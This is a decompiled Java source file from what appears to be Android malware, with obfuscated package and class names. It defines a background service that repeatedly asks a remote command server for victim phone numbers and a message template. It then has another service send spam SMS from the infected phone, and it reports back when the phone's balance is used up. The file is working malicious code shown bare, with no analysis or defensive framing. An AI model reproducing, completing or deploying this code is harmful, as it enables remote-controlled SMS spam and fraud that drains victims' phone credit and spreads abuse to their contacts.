package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class wifu extends IntentService {

    /* renamed from: a */
    C0034b f519a = new C0034b();

    /* renamed from: b */
    String f520b = "";

    /* renamed from: c */
    String f521c = "wifu";

    public wifu() {
        super("wifu");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (this.f519a.mo234e(this, "spamSMS").equals("start")) {
                if (!this.f519a.mo215a((Context) this, dshd.class)) {
                    if (this.f520b.length() > 3) {
                        StringBuilder sb = new StringBuilder();
                        sb.append("sendsms");
                        sb.append(this.f520b);
                        this.f520b = sb.toString();
                    }
                    if (this.f519a.mo234e(this, "indexSMSSPAM").contains("|||||")) {
                        this.f519a.mo233d(this, "spamSMS", "");
                        StringBuilder sb2 = new StringBuilder();
                        sb2.append("p=");
                        C0034b bVar = this.f519a;
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(this.f519a.mo247q(this));
                        sb3.append("|Ended balance, SMS spam stopped!|");
                        sb2.append(bVar.mo225c(sb3.toString()));
                        this.f519a.mo218b(this, "4", sb2.toString());
                    }
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append("p=");
                    C0034b bVar2 = this.f519a;
                    StringBuilder sb5 = new StringBuilder();
                    sb5.append("getnumber");
                    sb5.append(this.f520b);
                    sb4.append(bVar2.mo225c(sb5.toString()));
                    String d = this.f519a.mo230d(this.f519a.mo218b(this, "15", sb4.toString()));
                    String str = "";
                    String e2 = this.f519a.mo234e(this, "textSPAM");
                    if (d.contains("/")) {
                        str = d.split("/")[0];
                        d = d.split("/")[1];
                        e2 = e2.replace("{nameholder}", str);
                    }
                    if (d.equals("close")) {
                        this.f519a.mo233d(this, "spamSMS", "");
                        break;
                    }
                    C0034b bVar3 = this.f519a;
                    String str2 = this.f521c;
                    StringBuilder sb6 = new StringBuilder();
                    sb6.append("number: ");
                    sb6.append(d);
                    sb6.append("  msg: ");
                    sb6.append(e2);
                    bVar3.mo213a(str2, sb6.toString());
                    startService(new Intent(this, dshd.class).putExtra("number", d).putExtra("msg", e2));
                    if (str.length() > 2) {
                        StringBuilder sb7 = new StringBuilder();
                        sb7.append(str);
                        sb7.append("/");
                        sb7.append(d);
                        d = sb7.toString();
                    }
                    this.f520b = d;
                }
            } else {
                break;
            }
        }
        stopSelf();
    }
}
